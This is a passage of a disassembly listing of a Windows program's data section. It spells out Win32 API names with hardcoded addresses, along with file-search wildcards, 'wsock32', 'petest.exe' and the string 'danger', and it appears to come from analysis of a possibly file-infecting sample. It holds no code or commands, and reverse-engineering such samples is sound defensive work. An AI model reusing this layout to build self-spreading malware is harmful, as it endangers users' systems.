.data:004037FA                 db 0B9h
.data:004037FB                 db  80h
.data:004037FC                 db  7Ch ; |
.data:004037FD                 db  53h ; S
.data:004037FE                 db  65h ; e
.data:004037FF                 db  74h ; t
.data:00403800                 db  43h ; C
.data:00403801                 db  75h ; u
.data:00403802                 db  72h ; r
.data:00403803                 db  72h ; r
.data:00403804                 db  65h ; e
.data:00403805                 db  6Eh ; n
.data:00403806                 db  74h ; t
.data:00403807                 db  44h ; D
.data:00403808                 db  69h ; i
.data:00403809                 db  72h ; r
.data:0040380A                 db  65h ; e
.data:0040380B                 db  63h ; c
.data:0040380C                 db  74h ; t
.data:0040380D                 db  6Fh ; o
.data:0040380E                 db  72h ; r
.data:0040380F                 db  79h ; y
.data:00403810                 db    0
.data:00403811                 db  0Dh
.data:00403812                 db  61h ; a
.data:00403813                 db  83h
.data:00403814                 db  7Ch ; |
.data:00403815                 db  47h ; G
.data:00403816                 db  65h ; e
.data:00403817                 db  74h ; t
.data:00403818                 db  43h ; C
.data:00403819                 db  75h ; u
.data:0040381A                 db  72h ; r
.data:0040381B                 db  72h ; r
.data:0040381C                 db  65h ; e
.data:0040381D                 db  6Eh ; n
.data:0040381E                 db  74h ; t
.data:0040381F                 db  50h ; P
.data:00403820                 db  72h ; r
.data:00403821                 db  6Fh ; o
.data:00403822                 db  63h ; c
.data:00403823                 db  65h ; e
.data:00403824                 db  73h ; s
.data:00403825                 db  73h ; s
.data:00403826                 db    0
.data:00403827                 db  95h
.data:00403828                 db 0DEh
.data:00403829                 db  80h
.data:0040382A                 db  7Ch ; |
.data:0040382B                 db  53h ; S
.data:0040382C                 db  65h ; e
.data:0040382D                 db  74h ; t
.data:0040382E                 db  50h ; P
.data:0040382F                 db  72h ; r
.data:00403830                 db  69h ; i
.data:00403831                 db  6Fh ; o
.data:00403832                 db  72h ; r
.data:00403833                 db  69h ; i
.data:00403834                 db  74h ; t
.data:00403835                 db  79h ; y
.data:00403836                 db  43h ; C
.data:00403837                 db  6Ch ; l
.data:00403838                 db  61h ; a
.data:00403839                 db  73h ; s
.data:0040383A                 db  73h ; s
.data:0040383B                 db    0
.data:0040383C                 db  48h ; H
.data:0040383D                 db 0C3h
.data:0040383E                 db  82h
.data:0040383F                 db  7Ch ; |
.data:00403840                 db  4Dh ; M
.data:00403841                 db  65h ; e
.data:00403842                 db  73h ; s
.data:00403843                 db  73h ; s
.data:00403844                 db  61h ; a
.data:00403845                 db  67h ; g
.data:00403846                 db  65h ; e
.data:00403847                 db  42h ; B
.data:00403848                 db  6Fh ; o
.data:00403849                 db  78h ; x
.data:0040384A                 db    0
.data:0040384B                 db    0
.data:0040384C                 db    0
.data:0040384D                 db    0
.data:0040384E                 db    0
.data:0040384F                 db  43h ; C
.data:00403850                 db  72h ; r
.data:00403851                 db  65h ; e
.data:00403852                 db  61h ; a
.data:00403853                 db  74h ; t
.data:00403854                 db  65h ; e
.data:00403855                 db  4Dh ; M
.data:00403856                 db  75h ; u
.data:00403857                 db  74h ; t
.data:00403858                 db  65h ; e
.data:00403859                 db  78h ; x
.data:0040385A                 db    0
.data:0040385B                 db 0DFh
.data:0040385C                 db 0E9h
.data:0040385D                 db  80h
.data:0040385E                 db  7Ch ; |
.data:0040385F                 db  4Fh ; O
.data:00403860                 db  70h ; p
.data:00403861                 db  65h ; e
.data:00403862                 db  6Eh ; n
.data:00403863                 db  4Dh ; M
.data:00403864                 db  75h ; u
.data:00403865                 db  74h ; t
.data:00403866                 db  65h ; e
.data:00403867                 db  78h ; x
.data:00403868                 db    0
.data:00403869                 db 0BBh
.data:0040386A                 db 0EAh
.data:0040386B                 db  80h
.data:0040386C                 db  7Ch ; |
.data:0040386D                 db  52h ; R
.data:0040386E                 db  65h ; e
.data:0040386F                 db  6Ch ; l
.data:00403870                 db  65h ; e
.data:00403871                 db  61h ; a
.data:00403872                 db  73h ; s
.data:00403873                 db  65h ; e
.data:00403874                 db  4Dh ; M
.data:00403875                 db  75h ; u
.data:00403876                 db  74h ; t
.data:00403877                 db  65h ; e
.data:00403878                 db  78h ; x
.data:00403879                 db    0
.data:0040387A                 db 0B7h
.data:0040387B                 db  24h ; $
.data:0040387C                 db  80h
.data:0040387D                 db  7Ch ; |
.data:0040387E                 db  55h ; U
.data:0040387F                 db  6Eh ; n
.data:00403880                 db  6Dh ; m
.data:00403881                 db  61h ; a
.data:00403882                 db  70h ; p
.data:00403883                 db  56h ; V
.data:00403884                 db  69h ; i
.data:00403885                 db  65h ; e
.data:00403886                 db  77h ; w
.data:00403887                 db  4Fh ; O
.data:00403888                 db  66h ; f
.data:00403889                 db  46h ; F
.data:0040388A                 db  69h ; i
.data:0040388B                 db  6Ch ; l
.data:0040388C                 db  65h ; e
.data:0040388D                 db    0
.data:0040388E                 db  14h
.data:0040388F                 db 0BAh
.data:00403890                 db  80h
.data:00403891                 db  7Ch ; |
.data:00403892                 db  43h ; C
.data:00403893                 db  6Ch ; l
.data:00403894                 db  6Fh ; o
.data:00403895                 db  73h ; s
.data:00403896                 db  65h ; e
.data:00403897                 db  48h ; H
.data:00403898                 db  61h ; a
.data:00403899                 db  6Eh ; n
.data:0040389A                 db  64h ; d
.data:0040389B                 db  6Ch ; l
.data:0040389C                 db  65h ; e
.data:0040389D                 db    0
.data:0040389E                 db 0E7h
.data:0040389F                 db  9Bh
.data:004038A0                 db  80h
.data:004038A1                 db  7Ch ; |
.data:004038A2                 db  47h ; G
.data:004038A3                 db  65h ; e
.data:004038A4                 db  74h ; t
.data:004038A5                 db  54h ; T
.data:004038A6                 db  69h ; i
.data:004038A7                 db  63h ; c
.data:004038A8                 db  6Bh ; k
.data:004038A9                 db  43h ; C
.data:004038AA                 db  6Fh ; o
.data:004038AB                 db  75h ; u
.data:004038AC                 db  6Eh ; n
.data:004038AD                 db  74h ; t
.data:004038AE                 db    0
.data:004038AF                 db  4Ah ; J
.data:004038B0                 db  93h
.data:004038B1                 db  80h
.data:004038B2                 db  7Ch ; |
.data:004038B3                 db  47h ; G
.data:004038B4                 db  65h ; e
.data:004038B5                 db  74h ; t
.data:004038B6                 db  46h ; F
.data:004038B7                 db  69h ; i
.data:004038B8                 db  6Ch ; l
.data:004038B9                 db  65h ; e
.data:004038BA                 db  53h ; S
.data:004038BB                 db  69h ; i
.data:004038BC                 db  7Ah ; z
.data:004038BD                 db  65h ; e
.data:004038BE                 db    0
.data:004038BF                 db  17h
.data:004038C0                 db  0Bh
.data:004038C1                 db  81h
.data:004038C2                 db  7Ch ; |
.data:004038C3                 db  46h ; F
.data:004038C4                 db  69h ; i
.data:004038C5                 db  6Eh ; n
.data:004038C6                 db  64h ; d
.data:004038C7                 db  46h ; F
.data:004038C8                 db  69h ; i
.data:004038C9                 db  72h ; r
.data:004038CA                 db  73h ; s
.data:004038CB                 db  74h ; t
.data:004038CC                 db  46h ; F
.data:004038CD                 db  69h ; i
.data:004038CE                 db  6Ch ; l
.data:004038CF                 db  65h ; e
.data:004038D0                 db    0
.data:004038D1                 db  79h ; y
.data:004038D2                 db  38h ; 8
.data:004038D3                 db  81h
.data:004038D4                 db  7Ch ; |
.data:004038D5                 db  47h ; G
.data:004038D6                 db  65h ; e
.data:004038D7                 db  74h ; t
.data:004038D8                 db  46h ; F
.data:004038D9                 db  69h ; i
.data:004038DA                 db  6Ch ; l
.data:004038DB                 db  65h ; e
.data:004038DC                 db  41h ; A
.data:004038DD                 db  74h ; t
.data:004038DE                 db  74h ; t
.data:004038DF                 db  72h ; r
.data:004038E0                 db  69h ; i
.data:004038E1                 db  62h ; b
.data:004038E2                 db  75h ; u
.data:004038E3                 db  74h ; t
.data:004038E4                 db  65h ; e
.data:004038E5                 db  73h ; s
.data:004038E6                 db    0
.data:004038E7                 db 0DCh
.data:004038E8                 db  15h
.data:004038E9                 db  81h
.data:004038EA                 db  7Ch ; |
.data:004038EB                 db  46h ; F
.data:004038EC                 db  69h ; i
.data:004038ED                 db  6Eh ; n
.data:004038EE                 db  64h ; d
.data:004038EF                 db  4Eh ; N
.data:004038F0                 db  65h ; e
.data:004038F1                 db  78h ; x
.data:004038F2                 db  74h ; t
.data:004038F3                 db  46h ; F
.data:004038F4                 db  69h ; i
.data:004038F5                 db  6Ch ; l
.data:004038F6                 db  65h ; e
.data:004038F7                 db    0
.data:004038F8                 db 0E1h
.data:004038F9                 db  4Eh ; N
.data:004038FA                 db  83h
.data:004038FB                 db  7Ch ; |
.data:004038FC                 db  46h ; F
.data:004038FD                 db  69h ; i
.data:004038FE                 db  6Eh ; n
.data:004038FF                 db  64h ; d
.data:00403900                 db  43h ; C
.data:00403901                 db  6Ch ; l
.data:00403902                 db  6Fh ; o
.data:00403903                 db  73h ; s
.data:00403904                 db  65h ; e
.data:00403905                 db    0
.data:00403906                 db  77h ; w
.data:00403907                 db 0EEh
.data:00403908                 db  80h
.data:00403909                 db  7Ch ; |
.data:0040390A                 db    0
.data:0040390B                 db    0
.data:0040390C                 db    0
.data:0040390D                 db    0
.data:0040390E                 db    0
.data:0040390F                 db    0
.data:00403910                 db    0
.data:00403911                 db    0
.data:00403912                 db    0
.data:00403913                 db    0
.data:00403914                 db    0
.data:00403915                 db    0
.data:00403916                 db    0
.data:00403917                 db    0
.data:00403918                 db    0
.data:00403919                 db    0
.data:0040391A                 db    0
.data:0040391B                 db    0
.data:0040391C                 db    0
.data:0040391D                 db    0
.data:0040391E                 db    0
.data:0040391F                 db    0
.data:00403920                 db    0
.data:00403921                 db    0
.data:00403922                 db    0
.data:00403923                 db    0
.data:00403924                 db    0
.data:00403925                 db    0
.data:00403926                 db    0
.data:00403927                 db    0
.data:00403928                 db    0
.data:00403929                 db    0
.data:0040392A                 db    0
.data:0040392B                 db    0
.data:0040392C                 db    0
.data:0040392D                 db    0
.data:0040392E                 db    0
.data:0040392F                 db    0
.data:00403930                 db    0
.data:00403931                 db    0
.data:00403932                 db    0
.data:00403933                 db    0
.data:00403934                 db    0
.data:00403935                 db    0
.data:00403936                 db    0
.data:00403937                 db    0
.data:00403938                 db    0
.data:00403939                 db    0
.data:0040393A                 db    0
.data:0040393B                 db    0
.data:0040393C                 db    0
.data:0040393D                 db    0
.data:0040393E                 db    0
.data:0040393F                 db    0
.data:00403940                 db    0
.data:00403941                 db    0
.data:00403942                 db    0
.data:00403943                 db    0
.data:00403944                 db    0
.data:00403945                 db    0
.data:00403946                 db    0
.data:00403947                 db    0
.data:00403948                 db    0
.data:00403949                 db    0
.data:0040394A                 db    0
.data:0040394B                 db    0
.data:0040394C                 db    0
.data:0040394D                 db    0
.data:0040394E                 db    0
.data:0040394F                 db    0
.data:00403950                 db    0
.data:00403951                 db    0
.data:00403952                 db    0
.data:00403953                 db    0
.data:00403954                 db    0
.data:00403955                 db    0
.data:00403956                 db    0
.data:00403957                 db    0
.data:00403958                 db    0
.data:00403959                 db    0
.data:0040395A                 db    0
.data:0040395B                 db    0
.data:0040395C                 db    0
.data:0040395D                 db    0
.data:0040395E                 db    0
.data:0040395F                 db    0
.data:00403960                 db    0
.data:00403961                 db    0
.data:00403962                 db    0
.data:00403963                 db    0
.data:00403964                 db    0
.data:00403965                 db    0
.data:00403966                 db    0
.data:00403967                 db    0
.data:00403968                 db    0
.data:00403969                 db    0
.data:0040396A                 db    0
.data:0040396B                 db    0
.data:0040396C                 db    0
.data:0040396D                 db    0
.data:0040396E                 db    0
.data:0040396F                 db    0
.data:00403970                 db    0
.data:00403971                 db    0
.data:00403972                 db    0
.data:00403973                 db    0
.data:00403974                 db    0
.data:00403975                 db    0
.data:00403976                 db    0
.data:00403977                 db    0
.data:00403978                 db    0
.data:00403979                 db    0
.data:0040397A                 db    0
.data:0040397B                 db    0
.data:0040397C                 db    0
.data:0040397D                 db    0
.data:0040397E                 db    0
.data:0040397F                 db    0
.data:00403980                 db    0
.data:00403981                 db    0
.data:00403982                 db    0
.data:00403983                 db    0
.data:00403984                 db    0
.data:00403985                 db    0
.data:00403986                 db    0
.data:00403987                 db    0
.data:00403988                 db    0
.data:00403989                 db    0
.data:0040398A                 db    0
.data:0040398B                 db    0
.data:0040398C                 db    0
.data:0040398D                 db    0
.data:0040398E                 db    0
.data:0040398F                 db    0
.data:00403990                 db    0
.data:00403991                 db    0
.data:00403992                 db    0
.data:00403993                 db    0
.data:00403994                 db    0
.data:00403995                 db    0
.data:00403996                 db    0
.data:00403997                 db    0
.data:00403998                 db    0
.data:00403999                 db    0
.data:0040399A                 db    0
.data:0040399B                 db    0
.data:0040399C                 db    0
.data:0040399D                 db    0
.data:0040399E                 db    0
.data:0040399F                 db    0
.data:004039A0                 db    0
.data:004039A1                 db    0
.data:004039A2                 db    0
.data:004039A3                 db    0
.data:004039A4                 db    0
.data:004039A5                 db    0
.data:004039A6                 db    0
.data:004039A7                 db    0
.data:004039A8                 db    0
.data:004039A9                 db    0
.data:004039AA                 db    0
.data:004039AB                 db    0
.data:004039AC                 db    0
.data:004039AD                 db    0
.data:004039AE                 db    0
.data:004039AF                 db    0
.data:004039B0                 db    0
.data:004039B1                 db    0
.data:004039B2                 db    0
.data:004039B3                 db    0
.data:004039B4                 db    0
.data:004039B5                 db    0
.data:004039B6                 db    0
.data:004039B7                 db    0
.data:004039B8                 db    0
.data:004039B9                 db    0
.data:004039BA                 db    0
.data:004039BB                 db    0
.data:004039BC                 db    0
.data:004039BD                 db    0
.data:004039BE                 db    0
.data:004039BF                 db    0
.data:004039C0                 db    0
.data:004039C1                 db    0
.data:004039C2                 db    0
.data:004039C3                 db    0
.data:004039C4                 db    0
.data:004039C5                 db    0
.data:004039C6                 db    0
.data:004039C7                 db    0
.data:004039C8                 db    0
.data:004039C9                 db    0
.data:004039CA                 db    0
.data:004039CB                 db    0
.data:004039CC                 db    0
.data:004039CD                 db    0
.data:004039CE                 db    0
.data:004039CF                 db    0
.data:004039D0                 db    0
.data:004039D1                 db    0
.data:004039D2                 db    0
.data:004039D3                 db    0
.data:004039D4                 db    0
.data:004039D5                 db    0
.data:004039D6                 db    0
.data:004039D7                 db    0
.data:004039D8                 db    0
.data:004039D9                 db    0
.data:004039DA                 db    0
.data:004039DB                 db    0
.data:004039DC                 db    0
.data:004039DD                 db    0
.data:004039DE                 db    0
.data:004039DF                 db    0
.data:004039E0                 db    0
.data:004039E1                 db    0
.data:004039E2                 db    0
.data:004039E3                 db    0
.data:004039E4                 db    0
.data:004039E5                 db    0
.data:004039E6                 db    0
.data:004039E7                 db    0
.data:004039E8                 db    0
.data:004039E9                 db    0
.data:004039EA                 db    0
.data:004039EB                 db    0
.data:004039EC                 db    0
.data:004039ED                 db    0
.data:004039EE                 db    0
.data:004039EF                 db    0
.data:004039F0                 db    0
.data:004039F1                 db    0
.data:004039F2                 db    0
.data:004039F3                 db    0
.data:004039F4                 db    0
.data:004039F5                 db    0
.data:004039F6                 db    0
.data:004039F7                 db    0
.data:004039F8                 db    0
.data:004039F9                 db    0
.data:004039FA                 db    0
.data:004039FB                 db    0
.data:004039FC                 db    0
.data:004039FD                 db    0
.data:004039FE                 db    0
.data:004039FF                 db    0
.data:00403A00                 db    0
.data:00403A01                 db    0
.data:00403A02                 db    0
.data:00403A03                 db    0
.data:00403A04                 db    0
.data:00403A05                 db    0
.data:00403A06                 db    0
.data:00403A07                 db    0
.data:00403A08                 db    0
.data:00403A09                 db    0
.data:00403A0A                 db    0
.data:00403A0B                 db    0
.data:00403A0C                 db    0
.data:00403A0D                 db    0
.data:00403A0E                 db    0
.data:00403A0F                 db    0
.data:00403A10                 db    0
.data:00403A11                 db    0
.data:00403A12                 db    0
.data:00403A13                 db    0
.data:00403A14                 db    0
.data:00403A15                 db    0
.data:00403A16                 db    0
.data:00403A17                 db    0
.data:00403A18                 db    0
.data:00403A19                 db    0
.data:00403A1A                 db    0
.data:00403A1B                 db    0
.data:00403A1C                 db    0
.data:00403A1D                 db    0
.data:00403A1E                 db    0
.data:00403A1F                 db    0
.data:00403A20                 db    0
.data:00403A21                 db    0
.data:00403A22                 db    0
.data:00403A23                 db    0
.data:00403A24                 db    0
.data:00403A25                 db    0
.data:00403A26                 db    0
.data:00403A27                 db    0
.data:00403A28                 db    0
.data:00403A29                 db    0
.data:00403A2A                 db    0
.data:00403A2B                 db    0
.data:00403A2C                 db    0
.data:00403A2D                 db    0
.data:00403A2E                 db    0
.data:00403A2F                 db    0
.data:00403A30                 db    0
.data:00403A31                 db    0
.data:00403A32                 db    0
.data:00403A33                 db    0
.data:00403A34                 db    0
.data:00403A35                 db    0
.data:00403A36                 db    0
.data:00403A37                 db    0
.data:00403A38                 db    0
.data:00403A39                 db    0
.data:00403A3A                 db    0
.data:00403A3B                 db    0
.data:00403A3C                 db    0
.data:00403A3D                 db    0
.data:00403A3E                 db    0
.data:00403A3F                 db    0
.data:00403A40                 db    0
.data:00403A41                 db    0
.data:00403A42                 db    0
.data:00403A43                 db    0
.data:00403A44                 db    0
.data:00403A45                 db    0
.data:00403A46                 db    0
.data:00403A47                 db    0
.data:00403A48                 db    0
.data:00403A49                 db    0
.data:00403A4A                 db    0
.data:00403A4B                 db    0
.data:00403A4C                 db    0
.data:00403A4D                 db    0
.data:00403A4E                 db    0
.data:00403A4F                 db    0
.data:00403A50                 db    0
.data:00403A51                 db    0
.data:00403A52                 db    0
.data:00403A53                 db    0
.data:00403A54                 db    0
.data:00403A55                 db    0
.data:00403A56                 db    0
.data:00403A57                 db    0
.data:00403A58                 db    0
.data:00403A59                 db    0
.data:00403A5A                 db    0
.data:00403A5B                 db    0
.data:00403A5C                 db    0
.data:00403A5D                 db    0
.data:00403A5E                 db    0
.data:00403A5F                 db    0
.data:00403A60                 db    0
.data:00403A61                 db    0
.data:00403A62                 db    0
.data:00403A63                 db    0
.data:00403A64                 db    0
.data:00403A65                 db    0
.data:00403A66                 db    0
.data:00403A67                 db    0
.data:00403A68                 db    0
.data:00403A69                 db    0
.data:00403A6A                 db    0
.data:00403A6B                 db    0
.data:00403A6C                 db    0
.data:00403A6D                 db    0
.data:00403A6E                 db    0
.data:00403A6F                 db    0
.data:00403A70                 db    0
.data:00403A71                 db    0
.data:00403A72                 db    0
.data:00403A73                 db    0
.data:00403A74                 db    0
.data:00403A75                 db    0
.data:00403A76                 db    0
.data:00403A77                 db    0
.data:00403A78                 db    0
.data:00403A79                 db    0
.data:00403A7A                 db    0
.data:00403A7B                 db    0
.data:00403A7C                 db    0
.data:00403A7D                 db    0
.data:00403A7E                 db    0
.data:00403A7F                 db    0
.data:00403A80                 db    0
.data:00403A81                 db    0
.data:00403A82                 db    0
.data:00403A83                 db    0
.data:00403A84                 db    0
.data:00403A85                 db    0
.data:00403A86                 db    0
.data:00403A87                 db    0
.data:00403A88                 db    0
.data:00403A89                 db    0
.data:00403A8A                 db    0
.data:00403A8B                 db    0
.data:00403A8C                 db    0
.data:00403A8D                 db    0
.data:00403A8E                 db    0
.data:00403A8F                 db    0
.data:00403A90                 db    0
.data:00403A91                 db    0
.data:00403A92                 db    0
.data:00403A93                 db    0
.data:00403A94                 db    0
.data:00403A95                 db    0
.data:00403A96                 db    0
.data:00403A97                 db    0
.data:00403A98                 db  75h ; u
.data:00403A99                 db  73h ; s
.data:00403A9A                 db  65h ; e
.data:00403A9B                 db  72h ; r
.data:00403A9C                 db  33h ; 3
.data:00403A9D                 db  32h ; 2
.data:00403A9E                 db    0
.data:00403A9F                 db  77h ; w
.data:00403AA0                 db  73h ; s
.data:00403AA1                 db  6Fh ; o
.data:00403AA2                 db  63h ; c
.data:00403AA3                 db  6Bh ; k
.data:00403AA4                 db  33h ; 3
.data:00403AA5                 db  32h ; 2
.data:00403AA6                 db    0
.data:00403AA7                 db  70h ; p
.data:00403AA8                 db  65h ; e
.data:00403AA9                 db  74h ; t
.data:00403AAA                 db  65h ; e
.data:00403AAB                 db  73h ; s
.data:00403AAC                 db  74h ; t
.data:00403AAD                 db  2Eh ; .
.data:00403AAE                 db  65h ; e
.data:00403AAF                 db  78h ; x
.data:00403AB0                 db  65h ; e
.data:00403AB1                 db    0
.data:00403AB2                 db    0
.data:00403AB3                 db    0
.data:00403AB4                 db    0
.data:00403AB5                 db    0
.data:00403AB6                 db    0
.data:00403AB7                 db    0
.data:00403AB8                 db    0
.data:00403AB9                 db    0
.data:00403ABA                 db    0
.data:00403ABB                 db    0
.data:00403ABC                 db    0
.data:00403ABD                 db    0
.data:00403ABE                 db    0
.data:00403ABF                 db    0
.data:00403AC0                 db    0
.data:00403AC1                 db    0
.data:00403AC2                 db    0
.data:00403AC3                 db    0
.data:00403AC4                 db    0
.data:00403AC5                 db    0
.data:00403AC6                 db    0
.data:00403AC7                 db    0
.data:00403AC8                 db    0
.data:00403AC9                 db    0
.data:00403ACA                 db    0
.data:00403ACB                 db    0
.data:00403ACC                 db    0
.data:00403ACD                 db    0
.data:00403ACE                 db    0
.data:00403ACF                 db    0
.data:00403AD0                 db    0
.data:00403AD1                 db    0
.data:00403AD2                 db    0
.data:00403AD3                 db    0
.data:00403AD4                 db    0
.data:00403AD5                 db    0
.data:00403AD6                 db    0
.data:00403AD7                 db    0
.data:00403AD8                 db    0
.data:00403AD9                 db    0
.data:00403ADA                 db    0
.data:00403ADB                 db    0
.data:00403ADC                 db    0
.data:00403ADD                 db    0
.data:00403ADE                 db    0
.data:00403ADF                 db    0
.data:00403AE0                 db    0
.data:00403AE1                 db    0
.data:00403AE2                 db    0
.data:00403AE3                 db    0
.data:00403AE4                 db    0
.data:00403AE5                 db    0
.data:00403AE6                 db    0
.data:00403AE7                 db    0
.data:00403AE8                 db    0
.data:00403AE9                 db    0
.data:00403AEA                 db    0
.data:00403AEB                 db    0
.data:00403AEC                 db    0
.data:00403AED                 db    0
.data:00403AEE                 db    0
.data:00403AEF                 db    0
.data:00403AF0                 db    0
.data:00403AF1                 db    0
.data:00403AF2                 db    0
.data:00403AF3                 db    0
.data:00403AF4                 db    0
.data:00403AF5                 db    0
.data:00403AF6                 db    0
.data:00403AF7                 db    0
.data:00403AF8                 db    0
.data:00403AF9                 db    0
.data:00403AFA                 db    0
.data:00403AFB                 db    0
.data:00403AFC                 db    0
.data:00403AFD                 db    0
.data:00403AFE                 db    0
.data:00403AFF                 db    0
.data:00403B00                 db    0
.data:00403B01                 db    0
.data:00403B02                 db    0
.data:00403B03                 db    0
.data:00403B04                 db    0
.data:00403B05                 db    0
.data:00403B06                 db    0
.data:00403B07                 db    0
.data:00403B08                 db    0
.data:00403B09                 db    0
.data:00403B0A                 db    0
.data:00403B0B                 db    0
.data:00403B0C                 db    0
.data:00403B0D                 db    0
.data:00403B0E                 db    0
.data:00403B0F                 db    0
.data:00403B10                 db    0
.data:00403B11                 db    0
.data:00403B12                 db    0
.data:00403B13                 db    0
.data:00403B14                 db    0
.data:00403B15                 db    0
.data:00403B16                 db    0
.data:00403B17                 db    0
.data:00403B18                 db    0
.data:00403B19                 db    0
.data:00403B1A                 db    0
.data:00403B1B                 db    0
.data:00403B1C                 db    0
.data:00403B1D                 db    0
.data:00403B1E                 db    0
.data:00403B1F                 db    0
.data:00403B20                 db    0
.data:00403B21                 db    0
.data:00403B22                 db    0
.data:00403B23                 db    0
.data:00403B24                 db    0
.data:00403B25                 db    0
.data:00403B26                 db    0
.data:00403B27                 db    0
.data:00403B28                 db    0
.data:00403B29                 db    0
.data:00403B2A                 db    0
.data:00403B2B                 db    0
.data:00403B2C                 db    0
.data:00403B2D                 db    0
.data:00403B2E                 db    0
.data:00403B2F                 db    0
.data:00403B30                 db    0
.data:00403B31                 db    0
.data:00403B32                 db    0
.data:00403B33                 db    0
.data:00403B34                 db    0
.data:00403B35                 db    0
.data:00403B36                 db    0
.data:00403B37                 db    0
.data:00403B38                 db    0
.data:00403B39                 db    0
.data:00403B3A                 db    0
.data:00403B3B                 db    0
.data:00403B3C                 db    0
.data:00403B3D                 db    0
.data:00403B3E                 db    0
.data:00403B3F                 db    0
.data:00403B40                 db    0
.data:00403B41                 db    0
.data:00403B42                 db    0
.data:00403B43                 db    0
.data:00403B44                 db    0
.data:00403B45                 db    0
.data:00403B46                 db    0
.data:00403B47                 db    0
.data:00403B48                 db    0
.data:00403B49                 db    0
.data:00403B4A                 db    0
.data:00403B4B                 db    0
.data:00403B4C                 db    0
.data:00403B4D                 db    0
.data:00403B4E                 db    0
.data:00403B4F                 db    0
.data:00403B50                 db    0
.data:00403B51                 db    0
.data:00403B52                 db    0
.data:00403B53                 db    0
.data:00403B54                 db    0
.data:00403B55                 db    0
.data:00403B56                 db    0
.data:00403B57                 db    0
.data:00403B58                 db    0
.data:00403B59                 db    0
.data:00403B5A                 db    0
.data:00403B5B                 db    0
.data:00403B5C                 db    0
.data:00403B5D                 db    0
.data:00403B5E                 db    0
.data:00403B5F                 db    0
.data:00403B60                 db    0
.data:00403B61                 db    0
.data:00403B62                 db    0
.data:00403B63                 db    0
.data:00403B64                 db    0
.data:00403B65                 db    0
.data:00403B66                 db    0
.data:00403B67                 db    0
.data:00403B68                 db    0
.data:00403B69                 db    0
.data:00403B6A                 db    0
.data:00403B6B                 db    0
.data:00403B6C                 db    0
.data:00403B6D                 db    0
.data:00403B6E                 db    0
.data:00403B6F                 db    0
.data:00403B70                 db    0
.data:00403B71                 db    0
.data:00403B72                 db    0
.data:00403B73                 db    0
.data:00403B74                 db    0
.data:00403B75                 db    0
.data:00403B76                 db    0
.data:00403B77                 db    0
.data:00403B78                 db    0
.data:00403B79                 db    0
.data:00403B7A                 db    0
.data:00403B7B                 db    0
.data:00403B7C                 db    0
.data:00403B7D                 db    0
.data:00403B7E                 db    0
.data:00403B7F                 db    0
.data:00403B80                 db    0
.data:00403B81                 db    0
.data:00403B82                 db    0
.data:00403B83                 db    0
.data:00403B84                 db    0
.data:00403B85                 db    0
.data:00403B86                 db    0
.data:00403B87                 db    0
.data:00403B88                 db    0
.data:00403B89                 db    0
.data:00403B8A                 db    0
.data:00403B8B                 db    0
.data:00403B8C                 db    0
.data:00403B8D                 db    0
.data:00403B8E                 db    0
.data:00403B8F                 db    0
.data:00403B90                 db    0
.data:00403B91                 db    0
.data:00403B92                 db    0
.data:00403B93                 db    0
.data:00403B94                 db    0
.data:00403B95                 db    0
.data:00403B96                 db    0
.data:00403B97                 db    0
.data:00403B98                 db    0
.data:00403B99                 db    0
.data:00403B9A                 db    0
.data:00403B9B                 db    0
.data:00403B9C                 db    0
.data:00403B9D                 db    0
.data:00403B9E                 db    0
.data:00403B9F                 db    0
.data:00403BA0                 db    0
.data:00403BA1                 db    0
.data:00403BA2                 db    0
.data:00403BA3                 db    0
.data:00403BA4                 db    0
.data:00403BA5                 db    0
.data:00403BA6                 db    0
.data:00403BA7                 db    0
.data:00403BA8                 db    0
.data:00403BA9                 db    0
.data:00403BAA                 db    0
.data:00403BAB                 db    0
.data:00403BAC                 db    0
.data:00403BAD                 db    0
.data:00403BAE                 db    0
.data:00403BAF                 db    0
.data:00403BB0                 db    0
.data:00403BB1                 db    0
.data:00403BB2                 db    0
.data:00403BB3                 db    0
.data:00403BB4                 db    0
.data:00403BB5                 db    0
.data:00403BB6                 db  2Eh ; .
.data:00403BB7                 db  2Eh ; .
.data:00403BB8                 db    0
.data:00403BB9                 db  2Ah ; *
.data:00403BBA                 db  2Eh ; .
.data:00403BBB                 db  2Ah ; *
.data:00403BBC                 db    0
.data:00403BBD                 db 0E0h
.data:00403BBE                 db    7
.data:00403BBF                 db    0
.data:00403BC0                 db    0
.data:00403BC1                 db 0D8h
.data:00403BC2                 db    7
.data:00403BC3                 db    0
.data:00403BC4                 db    0
.data:00403BC5                 db    0
.data:00403BC6                 db    0
.data:00403BC7                 db  33h ; 3
.data:00403BC8                 db    0
.data:00403BC9                 db    0
.data:00403BCA                 db    0
.data:00403BCB                 db    0
.data:00403BCC                 db    0
.data:00403BCD                 db    0
.data:00403BCE                 db    0
.data:00403BCF                 db  80h
.data:00403BD0                 db  7Ch ; |
.data:00403BD1                 db    0
.data:00403BD2                 db    0
.data:00403BD3                 db    0
.data:00403BD4                 db    0
.data:00403BD5                 db    3
.data:00403BD6                 db    0
.data:00403BD7                 db    0
.data:00403BD8                 db    0
.data:00403BD9                 db 0E0h
.data:00403BDA                 db    0
.data:00403BDB                 db  33h ; 3
.data:00403BDC                 db    0
.data:00403BDD                 db    0
.data:00403BDE                 db  10h
.data:00403BDF                 db    0
.data:00403BE0                 db    0
.data:00403BE1                 db    0
.data:00403BE2                 db    4
.data:00403BE3                 db  33h ; 3
.data:00403BE4                 db    0
.data:00403BE5                 db    0
.data:00403BE6                 db    0
.data:00403BE7                 db  40h ; @
.data:00403BE8                 db    0
.data:00403BE9                 db 0C0h
.data:00403BEA                 db    1
.data:00403BEB                 db  33h ; 3
.data:00403BEC                 db    0
.data:00403BED                 db    0
.data:00403BEE                 db    2
.data:00403BEF                 db    0
.data:00403BF0                 db    0
.data:00403BF1                 db    0
.data:00403BF2                 db  10h
.data:00403BF3                 db    0
.data:00403BF4                 db    0
.data:00403BF5                 db    0
.data:00403BF6                 db    0
.data:00403BF7                 db    0
.data:00403BF8                 db    0
.data:00403BF9                 db  8Ah
.data:00403BFA                 db 0AAh
.data:00403BFB                 db  6Ah ; j
.data:00403BFC                 db  31h ; 1
.data:00403BFD                 db    0
.data:00403BFE                 db    0
.data:00403BFF                 db    0
.data:00403C00                 db    0
.data:00403C01                 db  2Ah ; *
.data:00403C02                 db  2Eh ; .
.data:00403C03                 db  2Ah ; *
.data:00403C04                 db    0
.data:00403C05                 db  2Eh ; .
.data:00403C06                 db  2Eh ; .
.data:00403C07                 db    0
.data:00403C08                 db  64h ; d
.data:00403C09                 db  61h ; a
.data:00403C0A                 db  6Eh ; n
.data:00403C0B                 db  67h ; g
.data:00403C0C                 db  65h ; e
.data:00403C0D                 db  72h ; r
.data:00403C0E                 db    0
